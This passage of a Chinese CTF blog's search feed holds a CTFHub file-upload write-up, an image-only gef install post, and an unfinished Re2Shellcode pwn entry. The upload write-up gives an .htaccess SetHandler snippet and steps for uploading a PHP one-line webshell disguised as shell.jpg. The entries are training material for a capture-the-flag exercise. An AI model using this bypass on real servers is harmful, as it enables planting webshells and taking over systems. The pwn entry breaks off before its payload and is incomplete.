class="string">&quot;swf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">in_array</span>($ext, $blacklist)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable constant_">UPLOAD_PATH</span> . $name)) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . <span class="variable constant_">UPLOAD_URL_PATH</span> . $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>函数功能是判断文件后缀名是否在黑名单中,在就输出”文件类型不匹配”.</p>
<p>做这道题我们首先要了解Apache的<a class="link"   href="https://httpd.apache.org/docs/2.4/mod/core.html#sethandler" >Sethandler指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,将其写入到.htaccess文件里可以将匹配到的文件强制使用另一种处理程序处理. 简单来说就是可以把一种文件强制当作另一种文件. 例如本题将使用的绕过代码:</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.jpg</span>&quot;&gt;</span>  </span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这段代码放进.htaccess中可将shell.jpg这个文件当作php文件处理.</p>
<p>好了,接下来让我们进行绕过工作</p>
<ol>
<li>将写好的PHP一句话木马的后缀名改成JPG或者其他允许的文件类型</li>
<li>创建一个.htaccess的文件(因为Windows不允许创建名字为空的文件,因此具体创建方法可以自行到网上搜索),将以上绕过代码填入其中,保存并上传,因为黑名单中没有.htaccess,可以直接上传.</li>
<li>最后直接访问<a class="link"   href="http://xxxxx.com/upload/shell.jpg%E8%80%81%E5%A5%97%E8%B7%AF%E5%8D%B3%E5%8F%AF(%E9%93%BE%E6%8E%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E5%90%8D%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E6%83%85%E5%86%B5%E4%BF%AE%E6%94%B9)" >http://xxxxx.com/upload/shell.jpg老套路即可(链接及文件名根据自己情况修改) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<p>目前先写到这,还有几道题有时间再写^ ^</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>CTFHub</tag>
        <tag>PHP</tag>
        <tag>.htaccess</tag>
        <tag>一句话木马</tag>
        <tag>前端验证</tag>
        <tag>文件上传</tag>
        <tag>无验证</tag>
        <tag>题型总结</tag>
      </tags>
  </entry>
  <entry>
    <title>gef的安装</title>
    <url>/2021/09/09/gef%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220210153453680.png"
                      alt="image-20220210153453680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220210153549199.png"
                      alt="image-20220210153549199"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220210153658743.png"
                      alt="image-20220210153658743"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220210153720109.png"
                      alt="image-20220210153720109"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220210153749722.png"
                      alt="image-20220210153749722"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>工具</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>[CTFHub]Re2Shellcode</title>
    <url>/2021/09/09/%5BCTFHub%5DRe2Shellcode/</url>
    <content><![CDATA[<h2 id="查看程序保护机制"><a href="#查看程序保护机制" class="headerlink" title="查看程序保护机制"></a>查看程序保护机制</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220223004540659.png"
                      alt="image-20220223004540659"
                ></p>
<h2 id="分析程序流程"><a href="#分析程序流程" class="headerlink" title="分析程序流程"></a>分析程序流程</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220223004839148.png"
                      alt="image-20220223004839148"
                ></p>
<p>输出中包含一个地址,然后让我们输入something,反汇编看一下:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gitee.com/nobugs404/imgbed/raw/master//blog/image-20220223010610944.png"
                      alt="image-20220223010610944"
                ></p>
<p>先来看下运行时输出的地址是什么,首先找到是40065c处的printf输出了地址</p>
<p>看下传进去的参数:rdi寄存器存的是<code>%rip+0xe2</code>指向存 <code>&quot;What is it : [%p] ?\n&quot;</code>这个字符串的地址, rsi寄存器存的是</p>
<h2 id="Pwn思路"><a href="#Pwn思路" class="headerlink" title="Pwn思路"></a>Pwn思路</h2><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>![image-20220302210254334](&#x2F;Users&#x2F;thou&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220302210254334.png)</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>CTFHub</tag>
        <tag>Re2Shellcode</tag>
      </tags>
  </entry>
</search>
